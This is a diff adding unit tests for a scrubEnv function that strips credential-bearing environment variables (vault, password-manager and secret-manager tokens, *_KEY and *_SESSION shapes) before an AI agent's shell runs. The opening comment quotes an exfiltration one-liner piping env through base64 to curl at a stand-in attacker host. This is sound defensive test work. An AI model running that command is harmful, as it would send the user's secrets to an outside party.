@@ -315,3 +315,152 @@ describe('scrubEnv', () => {
     });
   });
 });
+
+// Slice 162 (review — env scrub expansion). The 5-axis security
+// review flagged ad-hoc credential vars escaping the denylist: shape
+// patterns like `_KEY` / `_AUTH` / `_SESSION` weren't generic enough,
+// and service-specific names (VAULT_*, BW_*, LASTPASS_*, OP_CONNECT_*)
+// had no coverage. Pre-slice, a model emitting `bash "env | base64 |
+// curl https://attacker"` from a darwin or host-profile path could
+// exfil any of these. The macOS sandbox-exec parity wire (separate
+// part of slice 162) closes the sandboxed path; these patterns close
+// the host / degraded path.
+describe('scrubEnv — slice 162 expansion', () => {
+  test('drops *_KEY suffix (catches PRIVATE_KEY, SECRET_KEY, ENCRYPTION_KEY)', () => {
+    const out = scrubEnv({
+      PRIVATE_KEY: 'a',
+      SECRET_KEY: 'b',
+      ENCRYPTION_KEY: 'c',
+      API_KEY: 'd',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('drops *_AUTH, *_BEARER, *_CRED, *_CREDS, *_SESSION, *_COOKIE suffixes', () => {
+    const out = scrubEnv({
+      REGISTRY_AUTH: 'a',
+      ACCESS_BEARER: 'b',
+      GCLOUD_CRED: 'c',
+      AWS_CREDS: 'd',
+      AUTH_SESSION: 'e',
+      AUTH_COOKIE: 'f',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('drops VAULT_* prefix (HashiCorp Vault)', () => {
+    const out = scrubEnv({
+      VAULT_TOKEN: 'a',
+      VAULT_ADDR: 'https://vault.internal',
+      VAULT_NAMESPACE: 'ns',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('drops BW_* prefix (Bitwarden CLI)', () => {
+    const out = scrubEnv({
+      BW_SESSION: 'session-token',
+      BW_CLIENTID: 'client',
+      BW_CLIENTSECRET: 'secret',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('drops LPASS_*, LASTPASS_* prefixes (LastPass CLI)', () => {
+    const out = scrubEnv({
+      LPASS_AGENT_TIMEOUT: '3600',
+      LASTPASS_USER: 'op@example.com',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('drops OP_CONNECT_* prefix (1Password Connect)', () => {
+    const out = scrubEnv({
+      OP_CONNECT_TOKEN: 'connect-token',
+      OP_CONNECT_HOST: 'https://op-connect.internal',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('drops DOPPLER_TOKEN, INFISICAL_TOKEN (secret managers)', () => {
+    const out = scrubEnv({
+      DOPPLER_TOKEN: 'a',
+      INFISICAL_TOKEN: 'b',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('drops TWILIO_ACCOUNT_SID (half of Twilio auth pair)', () => {
+    // Pre-slice the suffix-based patterns missed account-SID style
+    // identifiers because `_SID` is not a credential-shape suffix
+    // by convention. Service-specific entry.
+    const out = scrubEnv({
+      TWILIO_ACCOUNT_SID: 'ACxxx',
+      KEEP: 'v',
+    });
+    expect(out).toEqual({ KEEP: 'v' });
+  });
+
+  test('case-insensitive matching for new patterns', () => {
+    const out = scrubEnv({
+      vault_token: 'a',
+      Bw_Session: 'b',
+      lastpass_USER: 'c',
+      KEEP: 'v',
+    });
+    // BW_ is case-sensitive (no /i flag — exact prefix). vault_token
+    // and lastpass_USER are case-insensitive.
+    expect(out.KEEP).toBe('v');
+    expect(out.vault_token).toBeUndefined();
+    expect(out.lastpass_USER).toBeUndefined();
+    // Bw_Session: BW_ pattern is case-sensitive, doesn't match. But
+    // _SESSION suffix (case-insensitive) catches it.
+    expect(out.Bw_Session).toBeUndefined();
+  });
+
+  test('regression: legitimate non-credential vars still pass', () => {
+    // The expansion should NOT scrub common dev / locale / runtime
+    // vars. This pins backward compat.
+    const out = scrubEnv({
+      PATH: '/usr/bin',
+      HOME: '/home/op',
+      USER: 'op',
+      TERM: 'xterm-256color',
+      LANG: 'en_US.UTF-8',
+      EDITOR: 'vim',
+      PAGER: 'less',
+      TZ: 'America/Sao_Paulo',
+      CI: 'true',
+      NODE_ENV: 'production',
+      RUST_LOG: 'debug',
+      CARGO_HOME: '/.cargo',
+      GOPATH: '/go',
+      JAVA_HOME: '/usr/lib/jvm/openjdk',
+      // Edge: contains "TOKEN" but not as a suffix word
+      MY_TOKENIZER_PATH: '/opt/tok',
+      // Edge: contains "AUTH" but not as a suffix
+      OAUTH_REDIRECT_URI: 'https://app/callback',
+    });
+    // None of these credential-adjacent-but-not-credential vars
+    // should be dropped.
+    expect(out.PATH).toBe('/usr/bin');
+    expect(out.HOME).toBe('/home/op');
+    expect(out.EDITOR).toBe('vim');
+    expect(out.PAGER).toBe('less');
+    expect(out.CI).toBe('true');
+    expect(out.NODE_ENV).toBe('production');
+    expect(out.RUST_LOG).toBe('debug');
+    expect(out.CARGO_HOME).toBe('/.cargo');
+    expect(out.GOPATH).toBe('/go');
+    expect(out.JAVA_HOME).toBe('/usr/lib/jvm/openjdk');
+    expect(out.MY_TOKENIZER_PATH).toBe('/opt/tok');
+    expect(out.OAUTH_REDIRECT_URI).toBe('https://app/callback');
+  });
+});
